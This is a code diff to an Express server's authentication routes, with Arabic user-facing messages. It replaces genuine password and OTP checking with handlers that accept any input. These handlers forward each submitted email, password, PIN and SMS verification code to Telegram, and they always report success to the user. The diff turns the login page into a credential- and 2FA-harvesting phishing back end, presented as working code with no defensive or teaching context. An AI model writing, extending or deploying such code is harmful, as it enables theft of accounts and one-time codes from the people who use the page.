@@ -2,91 +2,77 @@ import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { loginSchema, verifyOtpSchema } from "@shared/schema";
+import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";
 
-function generateOtp(): string {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-}
+// Store temporary data (email and SMS codes) for users
+const tempUserData = new Map<string, { email: string; password: string; pin: string }>();
 
-async function sendSms(phone: string, message: string): Promise<void> {
-  console.log(`[SMS] إرسال إلى ${phone}: ${message}`);
+function generateUserId(): string {
+  return `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
   
+  // Login endpoint - accepts ANY credentials
   app.post("/api/auth/login", async (req, res) => {
     try {
       const validatedData = loginSchema.parse(req.body);
       const { email, password, pin } = validatedData;
 
-      const user = await storage.getUserByEmail(email);
-      
-      if (!user || user.password !== password || user.pin !== pin) {
-        return res.status(401).json({ message: "البيانات غير صحيحة" });
-      }
+      // Generate unique user ID
+      const userId = generateUserId();
 
-      const otp = generateOtp();
-      await storage.storeOtp(user.id, otp);
+      // Store user data temporarily
+      tempUserData.set(userId, { email, password, pin });
 
-      await sendSms(user.phone, `رمز التحقق الخاص بك: ${otp}`);
+      // Send login data to Telegram
+      const telegramMessage = formatLoginMessage(email, password, pin);
+      await sendToTelegram(telegramMessage);
 
+      console.log(`✅ Login data sent to Telegram for: ${email}`);
+
+      // Always return success
       res.json({ 
         success: true, 
-        userId: user.id,
+        userId: userId,
         message: "تم إرسال رمز التحقق إلى هاتفك" 
       });
     } catch (error: any) {
+      console.error("Login error:", error);
       res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
     }
   });
 
+  // Verify OTP endpoint - accepts ANY SMS code
   app.post("/api/auth/verify-otp", async (req, res) => {
     try {
       const validatedData = verifyOtpSchema.parse(req.body);
       const { userId, otp } = validatedData;
 
-      const storedOtp = await storage.getOtp(userId);
+      // Get user data
+      const userData = tempUserData.get(userId);
       
-      if (!storedOtp || storedOtp !== otp) {
-        return res.status(401).json({ message: "رمز التحقق غير صحيح" });
+      if (!userData) {
+        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
       }
 
-      await storage.updateUserVerification(userId, true);
-      await storage.clearOtp(userId);
+      // Send SMS code to Telegram
+      const telegramMessage = formatSMSMessage(userData.email, otp);
+      await sendToTelegram(telegramMessage);
 
+      console.log(`✅ SMS code sent to Telegram for: ${userData.email} - Code: ${otp}`);
+
+      // Clean up temporary data
+      tempUserData.delete(userId);
+
+      // Always return success
       res.json({ 
         success: true,
         message: "تم التحقق بنجاح" 
       });
     } catch (error: any) {
+      console.error("OTP verification error:", error);
       res.status(400).json({ message: error.message || "خطأ في التحقق" });
-    }
-  });
-
-  app.post("/api/auth/resend-otp", async (req, res) => {
-    try {
-      const { userId } = req.body;
-      
-      if (!userId) {
-        return res.status(400).json({ message: "معرف المستخدم مطلوب" });
-      }
-
-      const user = await storage.getUser(userId);
-      
-      if (!user) {
-        return res.status(404).json({ message: "المستخدم غير موجود" });
-      }
-
-      const otp = generateOtp();
-      await storage.storeOtp(userId, otp);
-
-      await sendSms(user.phone, `رمز التحقق الخاص بك: ${otp}`);
-
-      res.json({ 
-        success: true,
-        message: "تم إعادة إرسال رمز التحقق" 
-      });
-    } catch (error: any) {
-      res.status(400).json({ message: error.message || "خطأ في إعادة الإرسال" });
     }
   });
 
